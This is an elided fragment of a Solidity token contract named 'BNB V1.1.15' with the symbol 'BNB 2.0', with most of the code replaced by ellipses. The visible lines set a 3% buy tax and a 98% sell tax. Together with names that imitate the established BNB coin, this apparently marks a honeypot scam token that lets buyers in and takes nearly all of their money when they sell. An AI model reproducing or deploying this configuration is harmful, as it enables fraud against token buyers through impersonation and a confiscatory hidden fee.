...
library Address{
 ...
 contract NewComm is Context, IERC20, Ownable {
    ...
    string private constant _name = "BNB V1.1.15";
    string private constant _symbol = "BNB 2.0";
    ...
    Taxes private taxes = Taxes(0,3,1, 0);
    Taxes private sellTaxes = Taxes(0, 98, 1, 0);
